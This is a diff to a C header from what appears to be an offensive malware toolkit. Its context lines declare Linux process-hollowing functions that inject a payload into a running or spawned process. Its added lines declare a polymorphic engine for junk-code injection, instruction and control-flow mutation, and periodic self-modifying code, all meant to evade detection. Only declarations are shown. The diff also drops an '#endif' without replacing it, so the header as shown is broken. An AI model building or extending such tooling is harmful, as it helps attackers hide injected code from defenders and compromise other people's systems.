@@ -674,7 +674,91 @@ bool jocky_process_hollow_linux(uint32_t pid, const void* payload, uint64_t payl
  */
 uint32_t jocky_spawn_hollow_linux(const char* target_path, const void* payload, uint64_t payload_size);
 
-#endif /* !_WIN32 */
+/* ============================================================================
+ * Polymorphic Obfuscation: Runtime Mutation and Randomization
+ * ============================================================================ */
+
+/* Core polymorphic mutation API - see mutation.h for full documentation */
+typedef void (*mutation_pass_fn)(uint8_t *code, size_t len);
+
+typedef struct {
+    const char *name;
+    mutation_pass_fn apply;
+    int priority;
+    int weight;
+} MutationPass;
+
+typedef struct {
+    MutationPass *passes;
+    int pass_count;
+    uint32_t seed;
+    int intensity;
+} MutationEngine;
+
+typedef struct {
+    uintptr_t start;
+    uintptr_t end;
+    uintptr_t fallthrough;
+} BasicBlock;
+
+typedef struct {
+    uintptr_t address;
+    uint8_t *mutation_payload;
+    size_t payload_len;
+    int mutation_count;
+    uint32_t checksum;
+} SelfModifyingSegment;
+
+typedef struct {
+    uint32_t mutations_applied;
+    uint32_t instructions_modified;
+    uint32_t blocks_reordered;
+    uint32_t self_modifications;
+    uint64_t total_cycles;
+} MutationStats;
+
+/* Initialize mutation engine with optional seed and intensity (1-5) */
+void jocky_mutation_init(MutationEngine *engine, uint32_t seed, int intensity);
+
+/* Apply random polymorphic mutations to code buffer */
+void jocky_apply_polymorphic_mutations(uint8_t *code, size_t len);
+
+/* Apply mutations with specific intensity level */
+void jocky_apply_mutations_intensity(uint8_t *code, size_t len, int intensity);
+
+/* Randomization utilities */
+void jocky_seed_rng(uint32_t seed);
+uint32_t jocky_random_u32(void);
+uint64_t jocky_random_u64(void);
+uint32_t jocky_random_range(uint32_t min, uint32_t max);
+void jocky_shuffle_array(void *array, size_t count, size_t elem_size);
+
+/* Instruction-level mutations */
+void jocky_mutate_instructions(uint8_t *code, size_t len);
+void jocky_mutate_constants(uint8_t *code, size_t len);
+void jocky_inject_junk_code(uint8_t *code, size_t len);
+void jocky_mutate_bitwise_ops(uint8_t *code, size_t len);
+void jocky_mutate_data_values(uint8_t *code, size_t len);
+
+/* Control flow mutations */
+BasicBlock *jocky_extract_basic_blocks(uint8_t *code, size_t len, int *out_count);
+void jocky_randomize_cfg(uint8_t *code, size_t len);
+void jocky_create_polymorphic_dispatch(uint8_t *code, size_t len);
+void jocky_randomize_switch_cases(uint8_t *code, size_t len);
+
+/* Self-modifying code */
+void jocky_enable_code_mutation(uintptr_t code_addr, size_t code_len);
+void jocky_apply_self_mutations(SelfModifyingSegment *segment);
+void jocky_enable_periodic_mutation(int interval_seconds);
+uint32_t jocky_compute_code_checksum(uint8_t *code, size_t len);
+bool jocky_verify_code_integrity(SelfModifyingSegment *segment);
+
+/* Mutation statistics and control */
+MutationStats jocky_get_mutation_stats(void);
+void jocky_reset_mutation_stats(void);
+void jocky_set_mutation_enabled(bool enabled);
+bool jocky_is_mutation_enabled(void);
+void jocky_reshuffle_mutations(void);
 
 #ifdef __cplusplus
 }
